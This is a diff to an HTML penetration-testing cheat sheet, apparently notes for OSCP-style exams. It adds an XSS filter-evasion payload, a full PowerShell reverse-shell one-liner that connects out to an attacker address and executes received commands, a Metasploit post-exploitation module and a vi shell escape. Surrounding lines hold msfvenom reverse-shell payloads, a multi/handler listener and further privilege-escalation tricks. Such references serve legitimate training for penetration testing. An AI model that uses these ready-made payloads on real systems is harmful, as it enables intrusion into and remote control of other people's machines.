@@ -123,6 +123,13 @@ wpscan --url [URL] --enumerate u	(Enum users)
 <p><font size="3.5" color="black">* https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md</font></p>
 
 <hr>
+<p><h3>XSS</h3></p>
+<p><font size="3.5" color="black">XSS Filter Evasion Cheat Sheet - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet#Basic_XSS_Test_Without_Filter_Evasion</font></p>
+<p><font size="3.5" color="black">XSS Filter Evasion eval(String.fromCharCode() method - http://jdstiles.com/java/cct.html
+<pre style="background-color:black;color:white;">
+Example: <img src="x/><script>eval(String.fromCharCode(CHARCODE_HERE));</script>">
+</pre>
+<br>
 <p><h3>DNS port discovered?</h3></p>
 <pre style="background-color:black;color:white;">
 whois domain-name-here.com			#WHOIS enumeration
@@ -269,6 +276,18 @@ $client = New-Object System.Net.Sockets.TCPClient("[IP_ADDRESS]",port);$stream =
 (Optional: in cmd or "cmd /c powershell -c "[reverse_powershell]"")
 </pre>
 </br>
+<pre style="background-color:black;color:white;">
+#Reverse powershell
+powershell -nop -c "$c = New-Object System.Net.Sockets.TCPClient('[IP_ADDRESS]',[PORT]);
+$st = $c.GetStream();[byte[]]$b = 0..65535|%{0};
+while(($i = $st.Read($b, 0, $b.Length)) -ne 0){;
+$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
+$sb = (IEX $d 2>&1 | Out-String );
+$sb2 = $sb + 'PS ' + (pwd).Path + '> ';
+$sby = ([text.encoding]::ASCII).GetBytes($sb2);
+$st.Write($sby,0,$sby.Length);$st.Flush()};$c.Close()"
+</pre>
+<br>
 <pre style="background-color:black;color:white;">
 #Syntax
 Cmdlets are small scripts that follow a dashseparated verb-noun convention such as "Get-Process".
@@ -437,9 +456,10 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] PORT=[ATTACKER's_PORT] -f macho > shell.macho	(reverse shell using msfvenom)
 msfvenom -p osx/x86/shell_reverse_tcp LHOST=[ATTACKER's_IP_ADDRESS] LPORT=[ATTACKER's_PORT] -f [LANGUAGE]		(reverse shell using msfvenom - shellcode)
 </pre>
-<p><font size="3.5" color="black">MSF handler</font></p>
+<p><font size="3.5" color="black">MSF stuff</font></p>
 <pre style="background-color:black;color:white;">
 msfconsole -x "use exploit/multi/handler;set LHOST [ATTACKER's_IP_ADDRESS];set LPORT [ATTACKER's_PORT];set PAYLOAD [PAYLOAD];run"
+use multi/recon/local_exploit_suggester	#Post module
 </pre>
 <p><font size="3.5" color="black">Prepared shellcodes at: http://shell-storm.org/shellcode/</font></p>
 <hr>
@@ -472,6 +492,9 @@ os.execute('/bin/sh')
 :set shell=/bin/bash
 :!bash
 </pre>
+<p><font size="3.5" color="black">Spawn TTY Shell from Vi</font></p>
+<pre style="background-color:black;color:white;">
+:!/bin/bash
 <p><font size="3.5" color="black">Spawn TTY Shell NMAP --interactive</font></p>
 <pre style="background-color:black;color:white;">
 !sh
